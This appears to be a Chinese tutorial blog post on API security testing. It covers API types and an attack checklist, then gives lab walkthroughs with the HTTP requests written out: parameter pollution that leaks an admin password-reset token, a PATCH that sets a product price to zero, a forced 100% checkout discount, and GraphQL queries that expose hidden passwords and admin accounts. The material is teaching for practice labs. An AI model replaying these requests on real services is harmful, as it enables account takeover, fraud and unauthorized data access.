---
title: 接口类型&测试方法&端点提取&暴漏攻击&枚举规则&RESTful风格&GraphQL语法
published: 2026-09-14T20:00:00
description: API攻防中RESTful与GraphQL类型利用，涵盖接口类型、检测流程与实战案例，包括参数污染、方法篡改、价格折扣泄露、GraphQL字段及隐藏端点探测，涉及越权、未授权和业务逻辑突破。
tags:
  - RESTful
  - GraphQL
  - API安全
category: 网络安全
draft: false
---

# 知识点

1. API攻防-类型利用-RESTful&GraphQL

# API接口类型

现在网站常用的就是这几种`API`接口：`RESTful、SOAP、GraphQL、OAuth、OpenAPI/Swagger`。

```
1、RESTful API(Representational State Transfer)：RESTful API是一种基于HTTP协议的API设计风格，它使用HTTP方法(例如：GET、POST、PUT、DELETE)来对资源进行操作并通过URL来唯一标识资源

2、SOAP API(Simple Object Access Protocol)：SOAP API是一种基于XML的通信协议，它使用SOAP消息格式进行数据交换，SOAP API通常使用WSDL(Web Services Description Language)描述接口，支持复杂的数据类型和协议扩展

3、GraphQL API(Graph Query Language)：GraphQL API是一种用于数据查询和操作的API查询语言，它允许客户端定义需要返回的数据结构，从而减少不必要的数据传输和多次请求

4、gRPC API：gRPC是一种高性能、开源的远程过程调用(RPC)框架，它支持多种编程语言并使用Protocol Buffers进行数据序列化和通信

5、WebSocket API：WebSocket API提供了一种全双工通信的机制，使得服务器和客户端可以实时地进行双向数据传输，适用于实时通信和推送场景

6、JSON-RPC API：JSON-RPC是一种轻量级的远程过程调用(RPC)协议，基于JSON格式进行数据交换，支持各种编程语言和平台

7、OAuth API：OAuth是一种开放标准的授权协议，用于用户授权第三方应用程序访问受保护的资源，OAuth API提供了一组用于身份验证和授权的接口

8、OpenAPI/Swagger API：OpenAPI(以前称为Swagger)是一种用于设计、构建和文档化API的规范和工具集。OpenAPI/Swagger API提供了一种描述API接口和操作的标准方式
```

举例非api接口和api接口对用户进行删除的端点url：

```
// 非api接口删除用户端点url:
www.xxx.com/admin/user?del=xxx

// api接口删除用户端点url:
DELETE www.xxx.com/api/users/xxx

GET www.xxx.com/api/users/del/xxx

POST www.xxx.com/api/users/del
{
	"username":"xxx"
}
```

# API检测流程

接口发现，遵循分类，依赖语言，V1/V2多版本等

接口发现：

```
JS等中提取，枚举爆破，响应提示等
```

Method：请求方法

```
攻击方式：OPTIONS,PUT,MOVE,DELETE
效果：上传恶意文件，修改页面等
URL：唯一资源定位符
攻击方式：猜测，遍历，跳转
效果：未授权访问等
```

Params：请求参数

```
攻击方式：构造参数，修改参数，遍历，重发
效果：爆破，越权，未授权访问，突破业务逻辑等
Authorization：认证方式
攻击方式：身份伪造，身份篡改
效果：越权，未授权访问等
```

Headers：请求消息头

```
攻击方式：拦截数据包，改Hosts，改Referer，改Content-Type等
效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等
```

Body：消息体

```
攻击方式：SQL注入，XML注入，反序列化等
效果：提权，突破业务逻辑，未授权访问等
```

# RESTful风格的测试

## API接口JS中URL泄露

首先登陆已给出的账号

修改邮箱抓取数据包：

```
PATCH /api/user/wiener HTTP/2
{"email":"aaa@qq"}
```

修改请求方式为POST，以及清空数据包中的json数据：

```
DELETE /api/user/carlos HTTP/2
```


## API接口泄露参数污染

抓取忘记密码的数据包：

```
POST /forgot-password HTTP/2
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator
```

响应数据包：

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

可以发现是有数据的回显，尝试修改请求包内容：

```
// 添加参数&x=y
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator%26x=y

// 响应不支持该参数
"error": "Parameter is not supported."

// 修改为#结尾
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator%23

// 响应字段未定义
"error": "Field not specified."

// 修改
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator%26field=x%23

// 响应
"type":"ClientError","code":400,"error":"Invalid field."

// 修改
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator%26field=email%23

// 响应
"result":"*****@normal-user.net","type":"email"
```

在加载的js文件中出现过以下代码：

```js
const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
    // 此处拼接为reset_token
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
```

于是将数据包修改为：

```
// 修改
csrf=HSh9MEmyXrwfeEqxp7ikxzC9CppUMr2Z&username=administrator%26field=reset_token%23

// 响应
"result":"1ftxi0j9q6kjw6mlifqd8l20lk9y5r04","type":"reset_token"
```

在url中拼接：`/forgot-password?reset_token=1ftxi0j9q6kjw6mlifqd8l20lk9y5r04`

最后密码成功修改，登录管理员账户并删除指定用户

## API接口利用提交方法

添加到购物车，抓取到数据包为：

```
GET /api/products/1/price HTTP/2
```

因为是GET请求，那么如果要实现修改价格的话肯定需要换成其他的，此时尝试将数据包的类型改为json，提交json数据包发现不被允许，又发现了返回数据头带有`Allow: GET, PATCH`

```
PATCH /api/products/1/price HTTP/2
Content-Type: application/json
{
	"price":0,
	"message":"test"
}
```

直接就实现了0元购

## API接口利用泄露参数

登录之后，在点击任意商品添加到购物车后，回到个人的购物车时，会产生一个`checkout`的请求

修改数据包为POST请求，数据类型为`json`，内容如下：

```
POST /api/checkout HTTP/2
Content-Type: application/json

{
	"chosen_discount":{
		"percentage":100 // 折扣改为100%
	},
	"chosen_products":[
		{
			"product_id":"1",
			"name":"Lightweight \"l33t\" Leather Jacket",
			"quantity":2,"item_price":133700
		}
	]
}
```

# GraphQL风格的测试：（上部分）

`GraphQL` 是一个用于 `API` 的查询语言，是一个使用基于类型系统来执行查询的服务端运行时（类型系统由你的数据定义）。`GraphQL` 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。  

可以把它理解为类似`thinkphp`框架作用。

利用核心：除常规测试思路外，语法是重点

测试插件：BurpSuite应用市场InQL

## 实验室：访问私人GraphQL数据

在burp安装InQL插件之后打开靶场进行抓包

使用`GraphQL`的会在数据包中高亮显示为蓝色

选中该包->扩展->InQL->generate queries->分析

在`queries`中有两个方法：

```
query getAllBlogPosts {
    getAllBlogPosts {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}

query getBlogPost {
    getBlogPost(id: Int!) {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}
```

先对`getAllBlogPosts`进行重发查看回显结果，结果打印出了四篇文章的id等信息，此时发现在id为1、2、4、5直接丢失了一个3

再对`getBlogPost`进行重发，将发送数据包的id改为3，此时得到password，提交结束

## 实验室：访问暴漏GraphQL字段

同上，找到使用`GraphQL`的数据包

这次多了一个`getUser`，修改发送包的`id`即可拿到管理员账户，删除任务要求的用户，完成

## 实验室：访问隐藏GraphQL端点

下节课实验，这次先放一点内容

`GraphQL`存在一个通用查询：`query{__typename}`

`query{__typename}` 是 GraphQL 里**万能、通用、必生效**的查询

**为什么它一定能生效？**

- `__typename` 是 GraphQL **内置保留字段**，所有服务强制实现
    
- 它不读取业务数据、不涉及权限、不需要参数
    
- 只返回当前查询对象的类型名称（固定是 `Query`）
    
- **没有任何 GraphQL 服务能禁用这个字段**

**不管哪个 GraphQL 服务**，发送这个查询，一定会返回固定格式的结果：

```csharp
{"data": {"__typename": "Query"}}
```

常见终点名称：

```
- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
```

如果这些共同端点没有返回 GraphQL 响应，你也可以尝试在路径上附加 `/v1`

# GraphQL和RESTful差异

```
RESTful：请求什么就换一个端点和参数

GraphQL：固定的端点里面的东西改变
```

解决1：目标使用GraphQL API技术判断

```
插件URL特征分析，提交的参数数据特征
```

解决2：目标使用GraphQL API初级安全测试技术

```
见演示
```

解决3：目标使用GraphQL API中高级安全测试技术（下节课）